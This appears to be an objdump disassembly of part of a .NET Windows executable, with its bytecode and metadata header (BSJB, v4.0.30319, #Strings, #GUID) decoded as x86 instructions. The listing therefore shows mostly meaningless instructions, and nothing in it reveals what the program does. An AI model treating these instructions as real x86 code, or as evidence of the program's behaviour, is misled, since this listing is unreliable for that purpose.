  405746:	00 00                	add    %al,(%eax)
  405748:	0a 07                	or     (%edi),%al
  40574a:	28 4a 00             	sub    %cl,0x0(%edx)
  40574d:	00 0a                	add    %cl,(%edx)
  40574f:	28 58 00             	sub    %bl,0x0(%eax)
  405752:	00 06                	add    %al,(%esi)
  405754:	0a 02                	or     (%edx),%al
  405756:	06                   	push   %es
  405757:	16                   	push   %ss
  405758:	06                   	push   %es
  405759:	8e 69 6f             	mov    0x6f(%ecx),%gs
  40575c:	4c                   	dec    %esp
  40575d:	00 00                	add    %al,(%eax)
  40575f:	0a 02                	or     (%edx),%al
  405761:	03 16                	add    (%esi),%edx
  405763:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  405769:	00 0a                	add    %cl,(%edx)
  40576b:	2a 13                	sub    (%ebx),%dl
  40576d:	30 04 00             	xor    %al,(%eax,%eax,1)
  405770:	21 00                	and    %eax,(%eax)
  405772:	00 00                	add    %al,(%eax)
  405774:	29 00                	sub    %eax,(%eax)
  405776:	00 11                	add    %dl,(%ecx)
  405778:	02 20                	add    (%eax),%ah
  40577a:	cf                   	iret
  40577b:	00 00                	add    %al,(%eax)
  40577d:	00 6f ee             	add    %ch,-0x12(%edi)
  405780:	00 00                	add    %al,(%eax)
  405782:	0a 03                	or     (%ebx),%al
  405784:	28 09                	sub    %cl,(%ecx)
  405786:	01 00                	add    %eax,(%eax)
  405788:	0a 0a                	or     (%edx),%cl
  40578a:	02 06                	add    (%esi),%al
  40578c:	28 58 00             	sub    %bl,0x0(%eax)
  40578f:	00 06                	add    %al,(%esi)
  405791:	16                   	push   %ss
  405792:	1e                   	push   %ds
  405793:	6f                   	outsl  %ds:(%esi),(%dx)
  405794:	4c                   	dec    %esp
  405795:	00 00                	add    %al,(%eax)
  405797:	0a 2a                	or     (%edx),%ch
  405799:	00 00                	add    %al,(%eax)
  40579b:	00 13                	add    %dl,(%ebx)
  40579d:	30 04 00             	xor    %al,(%eax,%eax,1)
  4057a0:	35 01 00 00 00       	xor    $0x1,%eax
  4057a5:	00 00                	add    %al,(%eax)
  4057a7:	00 03                	add    %al,(%ebx)
  4057a9:	16                   	push   %ss
  4057aa:	6a 3f                	push   $0x3f
  4057ac:	96                   	xchg   %eax,%esi
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 03                	add    %al,(%ebx)
  4057b1:	1f                   	pop    %ds
  4057b2:	7f 6a                	jg     0x40581e
  4057b4:	3d 09 00 00 00       	cmp    $0x9,%eax
  4057b9:	02 03                	add    (%ebx),%al
  4057bb:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4057be:	00 00                	add    %al,(%eax)
  4057c0:	0a 2a                	or     (%edx),%ch
  4057c2:	03 20                	add    (%eax),%esp
  4057c4:	ff 00                	incl   (%eax)
  4057c6:	00 00                	add    %al,(%eax)
  4057c8:	6a 3d                	push   $0x3d
  4057ca:	14 00                	adc    $0x0,%al
  4057cc:	00 00                	add    %al,(%eax)
  4057ce:	02 20                	add    (%eax),%ah
  4057d0:	cc                   	int3
  4057d1:	00 00                	add    %al,(%eax)
  4057d3:	00 6f ee             	add    %ch,-0x12(%edi)
  4057d6:	00 00                	add    %al,(%eax)
  4057d8:	0a 02                	or     (%edx),%al
  4057da:	03 d2                	add    %edx,%edx
  4057dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4057dd:	ee                   	out    %al,(%dx)
  4057de:	00 00                	add    %al,(%eax)
  4057e0:	0a 2a                	or     (%edx),%ch
  4057e2:	03 20                	add    (%eax),%esp
  4057e4:	ff                   	(bad)
  4057e5:	ff 00                	incl   (%eax)
  4057e7:	00 6a 3d             	add    %ch,0x3d(%edx)
  4057ea:	1b 00                	sbb    (%eax),%eax
  4057ec:	00 00                	add    %al,(%eax)
  4057ee:	02 20                	add    (%eax),%ah
  4057f0:	cd 00                	int    $0x0
  4057f2:	00 00                	add    %al,(%eax)
  4057f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4057f5:	ee                   	out    %al,(%dx)
  4057f6:	00 00                	add    %al,(%eax)
  4057f8:	0a 02                	or     (%edx),%al
  4057fa:	03 68 28             	add    0x28(%eax),%ebp
  4057fd:	5b                   	pop    %ebx
  4057fe:	00 00                	add    %al,(%eax)
  405800:	06                   	push   %es
  405801:	16                   	push   %ss
  405802:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  405805:	00 00                	add    %al,(%eax)
  405807:	0a 2a                	or     (%edx),%ch
  405809:	03 15 6e 3d 1b 00    	add    0x1b3d6e,%edx
  40580f:	00 00                	add    %al,(%eax)
  405811:	02 20                	add    (%eax),%ah
  405813:	ce                   	into
  405814:	00 00                	add    %al,(%eax)
  405816:	00 6f ee             	add    %ch,-0x12(%edi)
  405819:	00 00                	add    %al,(%eax)
  40581b:	0a 02                	or     (%edx),%al
  40581d:	03 69 28             	add    0x28(%ecx),%ebp
  405820:	5a                   	pop    %edx
  405821:	00 00                	add    %al,(%eax)
  405823:	06                   	push   %es
  405824:	16                   	push   %ss
  405825:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405828:	00 00                	add    %al,(%eax)
  40582a:	0a 2a                	or     (%edx),%ch
  40582c:	02 20                	add    (%eax),%ah
  40582e:	d3 00                	roll   %cl,(%eax)
  405830:	00 00                	add    %al,(%eax)
  405832:	6f                   	outsl  %ds:(%esi),(%dx)
  405833:	ee                   	out    %al,(%dx)
  405834:	00 00                	add    %al,(%eax)
  405836:	0a 02                	or     (%edx),%al
  405838:	03 28                	add    (%eax),%ebp
  40583a:	59                   	pop    %ecx
  40583b:	00 00                	add    %al,(%eax)
  40583d:	06                   	push   %es
  40583e:	16                   	push   %ss
  40583f:	1e                   	push   %ds
  405840:	6f                   	outsl  %ds:(%esi),(%dx)
  405841:	4c                   	dec    %esp
  405842:	00 00                	add    %al,(%eax)
  405844:	0a 2a                	or     (%edx),%ch
  405846:	03 20                	add    (%eax),%esp
  405848:	00 00                	add    %al,(%eax)
  40584a:	00 80 6a 3d 1a 00    	add    %al,0x1a3d6a(%eax)
  405850:	00 00                	add    %al,(%eax)
  405852:	02 20                	add    (%eax),%ah
  405854:	d3 00                	roll   %cl,(%eax)
  405856:	00 00                	add    %al,(%eax)
  405858:	6f                   	outsl  %ds:(%esi),(%dx)
  405859:	ee                   	out    %al,(%dx)
  40585a:	00 00                	add    %al,(%eax)
  40585c:	0a 02                	or     (%edx),%al
  40585e:	03 28                	add    (%eax),%ebp
  405860:	59                   	pop    %ecx
  405861:	00 00                	add    %al,(%eax)
  405863:	06                   	push   %es
  405864:	16                   	push   %ss
  405865:	1e                   	push   %ds
  405866:	6f                   	outsl  %ds:(%esi),(%dx)
  405867:	4c                   	dec    %esp
  405868:	00 00                	add    %al,(%eax)
  40586a:	0a 2a                	or     (%edx),%ch
  40586c:	03 20                	add    (%eax),%esp
  40586e:	00 80 ff ff 6a 3d    	add    %al,0x3d6affff(%eax)
  405874:	1b 00                	sbb    (%eax),%eax
  405876:	00 00                	add    %al,(%eax)
  405878:	02 20                	add    (%eax),%ah
  40587a:	d2 00                	rolb   %cl,(%eax)
  40587c:	00 00                	add    %al,(%eax)
  40587e:	6f                   	outsl  %ds:(%esi),(%dx)
  40587f:	ee                   	out    %al,(%dx)
  405880:	00 00                	add    %al,(%eax)
  405882:	0a 02                	or     (%edx),%al
  405884:	03 69 28             	add    0x28(%ecx),%ebp
  405887:	5a                   	pop    %edx
  405888:	00 00                	add    %al,(%eax)
  40588a:	06                   	push   %es
  40588b:	16                   	push   %ss
  40588c:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40588f:	00 00                	add    %al,(%eax)
  405891:	0a 2a                	or     (%edx),%ch
  405893:	03 1f                	add    (%edi),%ebx
  405895:	80 6a 3d 1b          	subb   $0x1b,0x3d(%edx)
  405899:	00 00                	add    %al,(%eax)
  40589b:	00 02                	add    %al,(%edx)
  40589d:	20 d1                	and    %dl,%cl
  40589f:	00 00                	add    %al,(%eax)
  4058a1:	00 6f ee             	add    %ch,-0x12(%edi)
  4058a4:	00 00                	add    %al,(%eax)
  4058a6:	0a 02                	or     (%edx),%al
  4058a8:	03 68 28             	add    0x28(%eax),%ebp
  4058ab:	5b                   	pop    %ebx
  4058ac:	00 00                	add    %al,(%eax)
  4058ae:	06                   	push   %es
  4058af:	16                   	push   %ss
  4058b0:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4058b3:	00 00                	add    %al,(%eax)
  4058b5:	0a 2a                	or     (%edx),%ch
  4058b7:	03 1f                	add    (%edi),%ebx
  4058b9:	e0 6a                	loopne 0x405925
  4058bb:	3d 14 00 00 00       	cmp    $0x14,%eax
  4058c0:	02 20                	add    (%eax),%ah
  4058c2:	d0 00                	rolb   $1,(%eax)
  4058c4:	00 00                	add    %al,(%eax)
  4058c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4058c7:	ee                   	out    %al,(%dx)
  4058c8:	00 00                	add    %al,(%eax)
  4058ca:	0a 02                	or     (%edx),%al
  4058cc:	03 d2                	add    %edx,%edx
  4058ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4058cf:	ee                   	out    %al,(%dx)
  4058d0:	00 00                	add    %al,(%eax)
  4058d2:	0a 2a                	or     (%edx),%ch
  4058d4:	02 03                	add    (%ebx),%al
  4058d6:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4058d9:	00 00                	add    %al,(%eax)
  4058db:	0a 2a                	or     (%edx),%ch
  4058dd:	00 00                	add    %al,(%eax)
  4058df:	00 1b                	add    %bl,(%ebx)
  4058e1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4058e4:	61                   	popa
  4058e5:	00 00                	add    %al,(%eax)
  4058e7:	00 2d 00 00 11 02    	add    %ch,0x2110000
  4058ed:	73 4d                	jae    0x40593c
  4058ef:	00 00                	add    %al,(%eax)
  4058f1:	0a 0a                	or     (%edx),%cl
  4058f3:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  4058f9:	0b 06                	or     (%esi),%eax
  4058fb:	07                   	pop    %es
  4058fc:	16                   	push   %ss
  4058fd:	1a 6f 45             	sbb    0x45(%edi),%ch
  405900:	00 00                	add    %al,(%eax)
  405902:	0a 26                	or     (%esi),%ah
  405904:	07                   	pop    %es
  405905:	16                   	push   %ss
  405906:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40590a:	0a 0c 06             	or     (%esi,%eax,1),%cl
  40590d:	16                   	push   %ss
  40590e:	73 0a                	jae    0x40591a
  405910:	01 00                	add    %eax,(%eax)
  405912:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  405918:	00 01                	add    %al,(%ecx)
  40591a:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  40591d:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405920:	08 6f 45             	or     %ch,0x45(%edi)
  405923:	00 00                	add    %al,(%eax)
  405925:	0a 26                	or     (%esi),%ah
  405927:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40592a:	05 dd 1a 00 00       	add    $0x1add,%eax
  40592f:	00 09                	add    %cl,(%ecx)
  405931:	39 06                	cmp    %eax,(%esi)
  405933:	00 00                	add    %al,(%eax)
  405935:	00 09                	add    %cl,(%ecx)
  405937:	6f                   	outsl  %ds:(%esi),(%dx)
  405938:	33 00                	xor    (%eax),%eax
  40593a:	00 0a                	add    %cl,(%edx)
  40593c:	dc 06                	faddl  (%esi)
  40593e:	39 06                	cmp    %eax,(%esi)
  405940:	00 00                	add    %al,(%eax)
  405942:	00 06                	add    %al,(%esi)
  405944:	6f                   	outsl  %ds:(%esi),(%dx)
  405945:	33 00                	xor    (%eax),%eax
  405947:	00 0a                	add    %cl,(%edx)
  405949:	dc 11                	fcoml  (%ecx)
  40594b:	05 2a 00 00 00       	add    $0x2a,%eax
  405950:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  405953:	00 02                	add    %al,(%edx)
  405955:	00 28                	add    %ch,(%eax)
  405957:	00 1c 44             	add    %bl,(%esp,%eax,2)
  40595a:	00 0d 00 00 00 00    	add    %cl,0x0
  405960:	02 00                	add    (%eax),%al
  405962:	07                   	pop    %es
  405963:	00 4a 51             	add    %cl,0x51(%edx)
  405966:	00 0d 00 00 00 00    	add    %cl,0x0
  40596c:	1b 30                	sbb    (%eax),%esi
  40596e:	04 00                	add    $0x0,%al
  405970:	5e                   	pop    %esi
  405971:	00 00                	add    %al,(%eax)
  405973:	00 2e                	add    %ch,(%esi)
  405975:	00 00                	add    %al,(%eax)
  405977:	11 73 d0             	adc    %esi,-0x30(%ebx)
  40597a:	00 00                	add    %al,(%eax)
  40597c:	0a 0a                	or     (%edx),%cl
  40597e:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  405984:	00 0a                	add    %cl,(%edx)
  405986:	0b 06                	or     (%esi),%eax
  405988:	07                   	pop    %es
  405989:	16                   	push   %ss
  40598a:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40598d:	00 00                	add    %al,(%eax)
  40598f:	0a 06                	or     (%esi),%al
  405991:	17                   	pop    %ss
  405992:	73 0a                	jae    0x40599e
  405994:	01 00                	add    %eax,(%eax)
  405996:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  405999:	02 16                	add    (%esi),%dl
  40599b:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4059a1:	00 0a                	add    %cl,(%edx)
  4059a3:	08 6f 4f             	or     %ch,0x4f(%edi)
  4059a6:	00 00                	add    %al,(%eax)
  4059a8:	0a dd                	or     %ch,%bl
  4059aa:	0d 00 00 00 08       	or     $0x8000000,%eax
  4059af:	39 06                	cmp    %eax,(%esi)
  4059b1:	00 00                	add    %al,(%eax)
  4059b3:	00 08                	add    %cl,(%eax)
  4059b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4059b6:	33 00                	xor    (%eax),%eax
  4059b8:	00 0a                	add    %cl,(%edx)
  4059ba:	dc 06                	faddl  (%esi)
  4059bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4059bd:	dd 00                	fldl   (%eax)
  4059bf:	00 0a                	add    %cl,(%edx)
  4059c1:	0d dd 0d 00 00       	or     $0xddd,%eax
  4059c6:	00 06                	add    %al,(%esi)
  4059c8:	39 06                	cmp    %eax,(%esi)
  4059ca:	00 00                	add    %al,(%eax)
  4059cc:	00 06                	add    %al,(%esi)
  4059ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4059cf:	33 00                	xor    (%eax),%eax
  4059d1:	00 0a                	add    %cl,(%edx)
  4059d3:	dc 09                	fmull  (%ecx)
  4059d5:	2a 00                	sub    (%eax),%al
  4059d7:	00 01                	add    %al,(%ecx)
  4059d9:	1c 00                	sbb    $0x0,%al
  4059db:	00 02                	add    %al,(%edx)
  4059dd:	00 20                	add    %ah,(%eax)
  4059df:	00 16                	add    %dl,(%esi)
  4059e1:	36 00 0d 00 00 00 00 	add    %cl,%ss:0x0
  4059e8:	02 00                	add    (%eax),%al
  4059ea:	06                   	push   %es
  4059eb:	00 49 4f             	add    %cl,0x4f(%ecx)
  4059ee:	00 0d 00 00 00 00    	add    %cl,0x0
  4059f4:	42                   	inc    %edx
  4059f5:	53                   	push   %ebx
  4059f6:	4a                   	dec    %edx
  4059f7:	42                   	inc    %edx
  4059f8:	01 00                	add    %eax,(%eax)
  4059fa:	01 00                	add    %eax,(%eax)
  4059fc:	00 00                	add    %al,(%eax)
  4059fe:	00 00                	add    %al,(%eax)
  405a00:	0c 00                	or     $0x0,%al
  405a02:	00 00                	add    %al,(%eax)
  405a04:	76 34                	jbe    0x405a3a
  405a06:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405a09:	33 30                	xor    (%eax),%esi
  405a0b:	33 31                	xor    (%ecx),%esi
  405a0d:	39 00                	cmp    %eax,(%eax)
  405a0f:	00 00                	add    %al,(%eax)
  405a11:	00 05 00 6c 00 00    	add    %al,0x6c00
  405a17:	00 bc 1d 00 00 23 7e 	add    %bh,0x7e230000(%ebp,%ebx,1)
  405a1e:	00 00                	add    %al,(%eax)
  405a20:	28 1e                	sub    %bl,(%esi)
  405a22:	00 00                	add    %al,(%eax)
  405a24:	fc                   	cld
  405a25:	26 00 00             	add    %al,%es:(%eax)
  405a28:	23 53 74             	and    0x74(%ebx),%edx
  405a2b:	72 69                	jb     0x405a96
  405a2d:	6e                   	outsb  %ds:(%esi),(%dx)
  405a2e:	67 73 00             	addr16 jae 0x405a31
  405a31:	00 00                	add    %al,(%eax)
  405a33:	00 24 45 00 00 34 28 	add    %ah,0x28340000(,%eax,2)
  405a3a:	00 00                	add    %al,(%eax)
  405a3c:	23 55 53             	and    0x53(%ebp),%edx
  405a3f:	00 58 6d             	add    %bl,0x6d(%eax)
  405a42:	00 00                	add    %al,(%eax)
  405a44:	10 00                	adc    %al,(%eax)
  405a46:	00 00                	add    %al,(%eax)
  405a48:	23 47 55             	and    0x55(%edi),%eax
  405a4b:	49                   	dec    %ecx
  405a4c:	44                   	inc    %esp
  405a4d:	00 00                	add    %al,(%eax)
  405a4f:	00 68 6d             	add    %ch,0x6d(%eax)
  405a52:	00 00                	add    %al,(%eax)
  405a54:	40                   	inc    %eax
  405a55:	09 00                	or     %eax,(%eax)
  405a57:	00 23                	add    %ah,(%ebx)
  405a59:	42                   	inc    %edx
  405a5a:	6c                   	insb   (%dx),%es:(%edi)
  405a5b:	6f                   	outsl  %ds:(%esi),(%dx)
  405a5c:	62 00                	bound  %eax,(%eax)
  405a5e:	00 00                	add    %al,(%eax)
  405a60:	00 00                	add    %al,(%eax)
  405a62:	00 00                	add    %al,(%eax)
  405a64:	02 00                	add    (%eax),%al
  405a66:	00 00                	add    %al,(%eax)
  405a68:	57                   	push   %edi
  405a69:	9f                   	lahf
  405a6a:	a2 3f 09 0a 00       	mov    %al,0xa093f
  405a6f:	00 00                	add    %al,(%eax)
  405a71:	fa                   	cli
  405a72:	25 33 00 16 00       	and    $0x160033,%eax
  405a77:	00 01                	add    %al,(%ecx)
  405a79:	00 00                	add    %al,(%eax)
  405a7b:	00 9b 00 00 00 1e    	add    %bl,0x1e000000(%ebx)
  405a81:	00 00                	add    %al,(%eax)
  405a83:	00 47 00             	add    %al,0x0(%edi)
  405a86:	00 00                	add    %al,(%eax)
  405a88:	a3 00 00 00 71       	mov    %eax,0x71000000
  405a8d:	00 00                	add    %al,(%eax)
  405a8f:	00 02                	add    %al,(%edx)
  405a91:	00 00                	add    %al,(%eax)
  405a93:	00 0a                	add    %cl,(%edx)
  405a95:	01 00                	add    %eax,(%eax)
  405a97:	00 13                	add    %dl,(%ebx)
  405a99:	00 00                	add    %al,(%eax)
  405a9b:	00 31                	add    %dh,(%ecx)
  405a9d:	00 00                	add    %al,(%eax)
  405a9f:	00 02                	add    %al,(%edx)
  405aa1:	00 00                	add    %al,(%eax)
  405aa3:	00 2e                	add    %ch,(%esi)
  405aa5:	00 00                	add    %al,(%eax)
  405aa7:	00 04 00             	add    %al,(%eax,%eax,1)
  405aaa:	00 00                	add    %al,(%eax)
  405aac:	13 00                	adc    (%eax),%eax
  405aae:	00 00                	add    %al,(%eax)
  405ab0:	20 00                	and    %al,(%eax)
  405ab2:	00 00                	add    %al,(%eax)
  405ab4:	04 00                	add    $0x0,%al
  405ab6:	00 00                	add    %al,(%eax)
  405ab8:	03 00                	add    (%eax),%eax
  405aba:	00 00                	add    %al,(%eax)
  405abc:	06                   	push   %es
  405abd:	00 00                	add    %al,(%eax)
  405abf:	00 06                	add    %al,(%esi)
  405ac1:	00 00                	add    %al,(%eax)
  405ac3:	00 02                	add    %al,(%edx)
  405ac5:	00 00                	add    %al,(%eax)
  405ac7:	00 01                	add    %al,(%ecx)
  405ac9:	00 00                	add    %al,(%eax)
  405acb:	00 08                	add    %cl,(%eax)
  405acd:	00 00                	add    %al,(%eax)
  405acf:	00 04 00             	add    %al,(%eax,%eax,1)
  405ad2:	00 00                	add    %al,(%eax)
  405ad4:	01 00                	add    %eax,(%eax)
  405ad6:	00 00                	add    %al,(%eax)
  405ad8:	00 00                	add    %al,(%eax)
  405ada:	14 1b                	adc    $0x1b,%al
  405adc:	01 00                	add    %eax,(%eax)
  405ade:	00 00                	add    %al,(%eax)
  405ae0:	00 00                	add    %al,(%eax)
  405ae2:	06                   	push   %es
  405ae3:	00 9d 21 95 18 0a    	add    %bl,0xa189521(%ebp)
  405ae9:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
  405aed:	1f                   	pop    %ds
  405aee:	0a 00                	or     (%eax),%al
  405af0:	da 21                	fisubl (%ecx)
  405af2:	13 21                	adc    (%ecx),%esp
  405af4:	0a 00                	or     (%eax),%al
  405af6:	49                   	dec    %ecx
  405af7:	18 7e 26             	sbb    %bh,0x26(%esi)
  405afa:	06                   	push   %es
  405afb:	00 48 1d             	add    %cl,0x1d(%eax)
  405afe:	8e 13                	mov    (%ebx),%ss
  405b00:	06                   	push   %es
  405b01:	00 f6                	add    %dh,%dh
  405b03:	0f 68 1f             	punpckhbw (%edi),%mm3
  405b06:	0a 00                	or     (%eax),%al
  405b08:	46                   	inc    %esi
  405b09:	19 68 1f             	sbb    %ebp,0x1f(%eax)
  405b0c:	0a 00                	or     (%eax),%al
  405b0e:	cc                   	int3
  405b0f:	20 7e 26             	and    %bh,0x26(%esi)
  405b12:	06                   	push   %es
  405b13:	00 27                	add    %ah,(%edi)
  405b15:	22 95 18 0e 00 8a    	and    -0x75fff1e8(%ebp),%dl
  405b1b:	1a ca                	sbb    %dl,%cl
  405b1d:	13 0e                	adc    (%esi),%ecx
  405b1f:	00 6b 21             	add    %ch,0x21(%ebx)
  405b22:	ca 13 06             	lret   $0x613
  405b25:	00 49 25             	add    %cl,0x25(%ecx)
  405b28:	8e 13                	mov    (%ebx),%ss
  405b2a:	06                   	push   %es
  405b2b:	00 a7 1c e8 23 06    	add    %ah,0x623e81c(%edi)
  405b31:	00 16                	add    %dl,(%esi)
  405b33:	19 95 18 0a 00 f1    	sbb    %edx,-0xefff5e8(%ebp)
  405b39:	1f                   	pop    %ds
  405b3a:	33 00                	xor    (%eax),%eax
  405b3c:	06                   	push   %es
  405b3d:	00 24 00             	add    %ah,(%eax,%eax,1)
  405b40:	b1 0a                	mov    $0xa,%cl
  405b42:	12 00                	adc    (%eax),%al
  405b44:	19 00                	sbb    %eax,(%eax)
  405b46:	00 1f                	add    %bl,(%edi)
  405b48:	12 00                	adc    (%eax),%al
  405b4a:	01 00                	add    %eax,(%eax)
  405b4c:	95                   	xchg   %eax,%ebp
  405b4d:	18 12                	sbb    %dl,(%edx)
  405b4f:	00 2c 10             	add    %ch,(%eax,%edx,1)
  405b52:	00 1f                	add    %bl,(%edi)
  405b54:	06                   	push   %es
  405b55:	00 97 0f 95 18 06    	add    %dl,0x618950f(%edi)
  405b5b:	00 bd 13 e8 23 06    	add    %bh,0x623e813(%ebp)
  405b61:	00 b0 1d 77 20 06    	add    %dh,0x620771d(%eax)
  405b67:	00 d8                	add    %bl,%al
  405b69:	0d 77 20 06 00       	or     $0x62077,%eax
  405b6e:	71 18                	jno    0x405b88
  405b70:	bd 05 06 00 39       	mov    $0x39000605,%ebp
  405b75:	11 00                	adc    %eax,(%eax)
  405b77:	1f                   	pop    %ds
  405b78:	06                   	push   %es
  405b79:	00 a6 11 00 1f 06    	add    %ah,0x61f0011(%esi)
  405b7f:	00 56 10             	add    %dl,0x10(%esi)
  405b82:	b0 1e                	mov    $0x1e,%al
  405b84:	6f                   	outsl  %ds:(%esi),(%dx)
  405b85:	00 20                	add    %ah,(%eax)
  405b87:	1f                   	pop    %ds
  405b88:	00 00                	add    %al,(%eax)
  405b8a:	06                   	push   %es
  405b8b:	00 7e 10             	add    %bh,0x10(%esi)
  405b8e:	ec                   	in     (%dx),%al
  405b8f:	19 06                	sbb    %eax,(%esi)
  405b91:	00 05 11 ec 19 06    	add    %al,0x619ec11
  405b97:	00 e6                	add    %ah,%dh
  405b99:	10 ec                	adc    %ch,%ah
  405b9b:	19 06                	sbb    %eax,(%esi)
  405b9d:	00 8d 11 ec 19 06    	add    %cl,0x619ec11(%ebp)
  405ba3:	00 59 11             	add    %bl,0x11(%ecx)
  405ba6:	ec                   	in     (%dx),%al
  405ba7:	19 06                	sbb    %eax,(%esi)
  405ba9:	00 72 11             	add    %dh,0x11(%edx)
  405bac:	ec                   	in     (%dx),%al
  405bad:	19 06                	sbb    %eax,(%esi)
  405baf:	00 95 10 ec 19 06    	add    %dl,0x619ec10(%ebp)
  405bb5:	00 c9                	add    %cl,%cl
  405bb7:	10 ec                	adc    %ch,%ah
  405bb9:	19 06                	sbb    %eax,(%esi)
  405bbb:	00 b0 10 e1 13 06    	add    %dh,0x613e110(%eax)
  405bc1:	00 6a 10             	add    %ch,0x10(%edx)
  405bc4:	e1 1e                	loope  0x405be4
  405bc6:	06                   	push   %es
  405bc7:	00 3b                	add    %bh,(%ebx)
  405bc9:	10 00                	adc    %al,(%eax)
  405bcb:	1f                   	pop    %ds
  405bcc:	06                   	push   %es
  405bcd:	00 22                	add    %ah,(%edx)
  405bcf:	11 ec                	adc    %ebp,%esp
  405bd1:	19 06                	sbb    %eax,(%esi)
  405bd3:	00 54 0b 8e          	add    %dl,-0x72(%ebx,%ecx,1)
  405bd7:	13 06                	adc    (%esi),%eax
  405bd9:	00 7c 23 95          	add    %bh,-0x6b(%ebx,%eiz,1)
  405bdd:	18 06                	sbb    %al,(%esi)
  405bdf:	00 ae 22 95 18 06    	add    %ch,0x6189522(%esi)
  405be5:	00 c1                	add    %al,%cl
  405be7:	13 e8                	adc    %eax,%ebp
  405be9:	23 0a                	and    (%edx),%ecx
  405beb:	00 d2                	add    %dl,%dl
  405bed:	25 68 1f 06 00       	and    $0x61f68,%eax
  405bf2:	ca 18 f3             	lret   $0xf318
  405bf5:	25 06 00 75 1c       	and    $0x1c750006,%eax
  405bfa:	f3 25 06 00 6f 13    	repz and $0x136f0006,%eax
  405c00:	f3 25 06 00 75 1a    	repz and $0x1a750006,%eax
  405c06:	95                   	xchg   %eax,%ebp
  405c07:	18 0a                	sbb    %cl,(%edx)
  405c09:	00 f9                	add    %bh,%cl
  405c0b:	20 b8 21 0a 00 45    	and    %bh,0x45000a21(%eax)
  405c11:	22 b8 21 0a 00 f7    	and    -0x8fff5df(%eax),%bh
  405c17:	16                   	push   %ss
  405c18:	b8 21 0a 00 19       	mov    $0x19000a21,%eax
  405c1d:	26 13 21             	adc    %es:(%ecx),%esp
  405c20:	0a 00                	or     (%eax),%al
  405c22:	b6 0f                	mov    $0xf,%dh
  405c24:	13 21                	adc    (%ecx),%esp
  405c26:	0a 00                	or     (%eax),%al
  405c28:	a1 0f 13 21 06       	mov    0x621130f,%eax
  405c2d:	00 50 14             	add    %dl,0x14(%eax)
  405c30:	95                   	xchg   %eax,%ebp
  405c31:	18 06                	sbb    %al,(%esi)
  405c33:	00 4a 1c             	add    %cl,0x1c(%edx)
  405c36:	95                   	xchg   %eax,%ebp
  405c37:	18 06                	sbb    %al,(%esi)
  405c39:	00 f1                	add    %dh,%cl
  405c3b:	18 95 18 0a 00 6a    	sbb    %dl,0x6a000a18(%ebp)
  405c41:	20 b8 21 0a 00 24    	and    %bh,0x24000a21(%eax)
  405c47:	20 b8 21 06 00 8a    	and    %bh,-0x75fff9df(%eax)
  405c4d:	20 95 18 06 00 e4    	and    %dl,-0x1bfff9e8(%ebp)
  405c53:	0d 95 18 0a 00       	or     $0xa1895,%eax
  405c58:	3b 18                	cmp    (%eax),%ebx
  405c5a:	13 21                	adc    (%ecx),%esp
  405c5c:	0a 00                	or     (%eax),%al
  405c5e:	04 16                	add    $0x16,%al
  405c60:	7e 26                	jle    0x405c88
  405c62:	0a 00                	or     (%eax),%al
  405c64:	22 23                	and    (%ebx),%ah
  405c66:	b8 21 0a 00 fe       	mov    $0xfe000a21,%eax
  405c6b:	19 68 1f             	sbb    %ebp,0x1f(%eax)
  405c6e:	0a 00                	or     (%eax),%al
  405c70:	48                   	dec    %eax
  405c71:	20 cd                	and    %cl,%ch
  405c73:	19 06                	sbb    %eax,(%esi)
  405c75:	00 e6                	add    %ah,%dh
  405c77:	11 95 18 06 00 28    	adc    %edx,0x28000618(%ebp)
  405c7d:	16                   	push   %ss
  405c7e:	8e 13                	mov    (%ebx),%ss
  405c80:	06                   	push   %es
  405c81:	00 f6                	add    %dh,%dh
  405c83:	15 95 18 0a 00       	adc    $0xa1895,%eax
  405c88:	79 15                	jns    0x405c9f
  405c8a:	95                   	xchg   %eax,%ebp
  405c8b:	18 0a                	sbb    %cl,(%edx)
  405c8d:	00 83 0f 95 18 06    	add    %al,0x618950f(%ebx)
  405c93:	00 80 1d 95 18 06    	add    %al,0x618951d(%eax)
  405c99:	00 63 23             	add    %ah,0x23(%ebx)
  405c9c:	8e 13                	mov    (%ebx),%ss
  405c9e:	06                   	push   %es
  405c9f:	00 6b 18             	add    %ch,0x18(%ebx)
  405ca2:	bd 05 06 00 1b       	mov    $0x1b000605,%ebp
  405ca7:	1e                   	push   %ds
  405ca8:	8e 13                	mov    (%ebx),%ss
  405caa:	0a 00                	or     (%eax),%al
  405cac:	9d                   	popf
  405cad:	0d 13 21 06 00       	or     $0x62113,%eax
  405cb2:	5f                   	pop    %edi
  405cb3:	01 95 18 06 00 99    	add    %edx,-0x66fff9e8(%ebp)
  405cb9:	1a bd 05 0a 00 f1    	sbb    -0xefff5fb(%ebp),%bh
  405cbf:	20 b0 1e 0a 00 db    	and    %dh,-0x24fff5e2(%eax)
  405cc5:	1a b0 1e 06 00 dc    	sbb    -0x23fff9e2(%eax),%dh
  405ccb:	25 33 00 06 00       	and    $0x60033,%eax
  405cd0:	62 1d bd 05 06 00    	bound  %ebx,0x605bd
